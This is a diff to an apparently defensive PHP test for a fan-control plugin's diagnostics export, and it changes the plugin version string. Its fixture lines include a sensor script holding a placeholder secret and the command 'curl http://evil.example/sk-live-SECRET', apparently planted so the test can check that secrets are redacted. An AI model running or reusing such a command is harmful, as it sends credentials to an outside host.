@@ -98,7 +98,7 @@ $put("$cfg/sensors.d/rack_ambient_sensor", "#!/bin/sh\necho 37 # token=sk-live-S
 $put("$cfg/sensors.d/other_script", "curl http://evil.example/sk-live-SECRET\n");
 $put("$cfg/sensors.d/.hidden", "x");
 mkdir("$cfg/sensors.d/nested");
-$put("$root/plugins/fanctrlplus2.plg", "<?xml version='1.0'?>\n<PLUGIN\n  name=\"fanctrlplus2\"\n  version=\"2026.11.08\"\n>\n");
+$put("$root/plugins/fanctrlplus2.plg", "<?xml version='1.0'?>\n<PLUGIN\n  name=\"fanctrlplus2\"\n  version=\"2026.11.08pr30b\"\n>\n");
 $put("$cfg/fanctrlplus2_A bad name.cfg", "custom=\"PRIVATE\"\n");
 $put("$cfg/fanctrlplus2_backup.old.cfg", "custom=\"PRIVATE\"\n");
 
@@ -160,7 +160,7 @@ $json = fn(string $name) => json_decode($files[$name], true, 512, JSON_THROW_ON_
 $fans = $json('fans.json'); $hardware = $json('hardware.json'); $events = $json('events.json')['events']; $manifest = $json('manifest.json');
 
 // ---- Useful data survives. ----
-$check($manifest['format'] === 'fanctrlplus2-diagnostics' && $manifest['version'] === 1 && $manifest['plugin_version'] === '2026.11.08'
+$check($manifest['format'] === 'fanctrlplus2-diagnostics' && $manifest['version'] === 1 && $manifest['plugin_version'] === '2026.11.08pr30b'
     && preg_match('/^\d{4}-\d\d-\d\dT\d\d:\d\d:\d\dZ$/D', $manifest['generated_utc']), 'The manifest must identify format, plugin version and time.');
 $check(count($fans['fans']) === 3 && $fans['custom_sensor_scripts'] === 2 && $fans['skipped_configs'] === 2, 'Badly named files must not prevent diagnostics and must be counted.');
 [$broken, $legacy, $secret] = $fans['fans'];
